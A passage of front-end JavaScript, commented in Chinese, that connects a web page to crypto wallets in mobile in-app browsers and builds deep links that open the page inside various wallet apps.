    else if (walletBrowserInfo.walletId === 'tokenpocket') {
      if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ TokenPocket: Using window.ethereum');
      }
    }
    // 8) 其他钱包或 unknown：默认用 window.ethereum
    else {
      if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log(`✅ ${walletBrowserInfo.walletName || 'Unknown'}: Using window.ethereum`);
      }
    }

    if (!walletProvider) {
      showToast('Wallet provider not detected. Please refresh the page.', 'err');
      addLog('err', 'No wallet provider found in wallet browser');
      return;
    }

    // 带超时的连接请求（30秒超时，避免钱包浏览器卡死）
    const connectWithTimeout = async (provider, timeoutMs = 30000) => {
      return Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Connection request timed out. Please try again.')), timeoutMs)
        )
      ]);
    };

    // 创建 ethers provider
    provider = new ethers.providers.Web3Provider(walletProvider);

    // 请求连接（带超时）
    let accounts;
    try {
      accounts = await connectWithTimeout(walletProvider);
    } catch (timeoutErr) {
      // 超时后尝试备用方式：eth_accounts（不弹窗，只获取已有授权）
      console.warn('⚠️ eth_requestAccounts timed out, trying eth_accounts...');
      try {
        accounts = await walletProvider.request({ method: 'eth_accounts' });
      } catch (fallbackErr) {
        throw timeoutErr; // 仍然抛出超时错误
      }
    }

    if (!accounts || accounts.length === 0) {
      showToast('Please authorize the connection in your wallet', 'err');
      return;
    }

    signer = provider.getSigner();
    walletAddress = await signer.getAddress();

    // 获取 chainId（兼容不同 provider 的返回格式）
    try {
      const network = await provider.getNetwork();
      chainId = network.chainId;
    } catch (e) {
      // 降级：手动从 provider 获取
      try {
        const chainIdHex = await walletProvider.request({ method: 'eth_chainId' });
        chainId = parseInt(chainIdHex, 16);
      } catch (e2) {
        chainId = 1; // 默认 Ethereum
      }
    }

    // 监听账户和链变化（兼容不同事件系统）
    if (walletProvider.on) {
      walletProvider.on('accountsChanged', handleAccountsChanged);
      walletProvider.on('chainChanged', (newChainId) => {
        // 有些钱包返回 hex string，有些返回 number
        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
      });
    } else if (walletProvider.addListener) {
      // 某些钱包用 addListener 而不是 on
      walletProvider.addListener('accountsChanged', handleAccountsChanged);
      walletProvider.addListener('chainChanged', (newChainId) => {
        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
      });
    }

    updateUI();
    showToast(`Connected to ${walletBrowserInfo.walletName || 'Wallet'}`, 'ok');
    addLog('info', `Connected to ${walletBrowserInfo.walletName || 'Wallet'}: ${walletAddress}`);

  } catch (error) {
    console.error('❌ Error connecting to wallet browser:', error);
    console.error(`❌ Error code: ${error.code}, message: ${error.message}`);
    console.error(`❌ walletBrowserInfo: ${JSON.stringify(walletBrowserInfo)}`);
    console.error(`❌ window.ethereum: ${typeof window.ethereum}`);
    console.error(`❌ window.BinanceChain: ${typeof window.BinanceChain}`);
    // 用户拒绝连接
    if (error.code === 4001) {
      showToast('Connection rejected by user', 'err');
      addLog('info', 'User rejected wallet connection');
    } else {
      showToast(error.message || 'Connection failed. Please refresh and try again.', 'err');
    }
  }
}

function isMobileDevice() {
  const ua = navigator.userAgent;
  // 标准 Mobile 检测
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return true;
  // iPad on iOS 13+ 检测（UA 和 Mac 一样，但支持触控）
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

function getMobileOS() {
  const userAgent = navigator.userAgent;
  if (/Android/i.test(userAgent)) {
    return 'android';
  } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
    return 'ios';
  }
  return 'unknown';
}

function showMobileWalletHint() {
  const walletList = document.getElementById('walletList');
  const hintDiv = document.createElement('div');
  hintDiv.className = 'mobile-wallet-hint';
  hintDiv.innerHTML = `
    <div class="hint-icon">📱</div>
    <p class="hint-text">${t('mobileWalletHint')}</p>
    <p class="hint-subtext">${t('mobileWalletSubtext')}</p>
  `;
  walletList.insertBefore(hintDiv, walletList.firstChild);
}

function openWalletDeepLink(walletId) {
  // ✅ 重新检测
  walletBrowserInfo = detectWalletBrowser();
  
  // ✅ 铁律：移动端 + 有 ethereum = 在钱包内浏览器，绝不跳转深度链接
  // 手机浏览器没有插件机制，有 ethereum 一定是钱包 App 内置浏览器
  if (walletBrowserInfo.isWalletBrowser || (isMobileDevice() && typeof window.ethereum !== 'undefined')) {
    console.log('⚠️ In wallet browser (mobile + ethereum), skipping deep link to avoid redirecting away');
    return false;
  }

  const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
  if (!wallet || !wallet.deepLink) {
    return false;
  }

  const currentUrl = window.location.href;
  const os = getMobileOS();
  
  console.log(`🔗 Wallet: ${wallet.name}`);
  console.log(`📱 System: ${os}`);
  console.log(`🌐 Current URL: ${currentUrl}`);

  let deepLinkUrl = '';
  
  // 针对不同钱包使用不同的深度链接格式
  if (wallet.id === 'metamask') {
    deepLinkUrl = `https://metamask.app.link/dapp/${currentUrl.replace(/^(https?:\/\/)/, '')}`;
  } else if (wallet.id === 'trust') {
    // Trust Wallet 官方深度链接格式
    // https://link.trustwallet.com/open_url?coin_id=60&url=ENCODED_URL
    // coin_id=60 = Ethereum, coin_id=195 = TRON
    deepLinkUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'coinbase') {
    deepLinkUrl = `https://go.cb-w.com/dapp?url=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'okx') {
    deepLinkUrl = `https://www.okx.com/download?dappUrl=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'imtoken') {
    deepLinkUrl = `imtokenv2://navigate/DappView?url=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'tokenpocket') {
    deepLinkUrl = `tpoutside://navigate?dappUrl=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'bitget') {
    // Bitget Wallet 深度链接
    deepLinkUrl = `https://bkcode.vip/dapp?url=${encodeURIComponent(currentUrl)}`;
  } else if (wallet.id === 'binance') {
    // 币安钱包深度链接：使用 Binance App 的 DApp Browser universal link
    deepLinkUrl = `https://www.binance.com/en/web3/dapp?url=${encodeURIComponent(currentUrl)}`;
  } else {
    // 默认格式
    if (os === 'ios') {
      deepLinkUrl = wallet.deepLink.ios + encodeURIComponent(currentUrl);
    } else if (os === 'android') {
      deepLinkUrl = wallet.deepLink.android + encodeURIComponent(currentUrl);
    } else {
      deepLinkUrl = wallet.deepLink.universal + encodeURIComponent(currentUrl);
    }
  }

  console.log(`🚀 Deep Link: ${deepLinkUrl}`);

  const startTime = Date.now();
  const timeout = 2500;

  // 尝试多种方式唤起钱包
  try {
    // 方法1: 使用 window.location.href
    window.location.href = deepLinkUrl;
  } catch (e) {
    console.log(`⚠️ Method 1 failed: ${e.message}`);
    // 方法2: 使用 window.open
    try {
      window.open(deepLinkUrl, '_self');
    } catch (e2) {
      console.log(`⚠️ Method 2 failed: ${e2.message}`);
    }
  }

  // 在新窗口/标签页中打开URL后，设置定时器检测连接状态
  setTimeout(async () => {
    // 检查是否成功跳转到钱包并返回
    if (Date.now() - startTime < timeout + 100) {
      console.log(`⚠️ Wallet may not be installed or deep link failed`);
      if (wallet.downloadUrl) {
        const confirmed = confirm(t('walletNotDetected').replace('{wallet}', wallet.name));
        if (confirmed) {
          window.open(wallet.downloadUrl, '_blank');
        }
      }
    }
  }, timeout);

  // 返回true表示深度链接已发送
  return true;
}

// 手动打开钱包的辅助函数
function openWalletManually(walletId) {
  const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
  if (!wallet) return false;
  
  const currentUrl = window.location.href;
  
  // 创建一个提示框，显示手动操作步骤
  const manualInstructions = `${t('walletManualTitle')}

${t('walletManualStep1')}
   ${currentUrl}

${t('walletManualStep2').replace('{wallet}', wallet.name)}

${t('walletManualStep3')}

${t('walletManualStep4')}
  `;
  
  alert(manualInstructions);
  
  // 自动复制链接到剪贴板
  navigator.clipboard.writeText(currentUrl).then(() => {
    showToast(t('linkCopied'), 'ok');
  }).catch(() => {
    showToast(t('copyFailed'), 'err');
  });
  
  return true;
}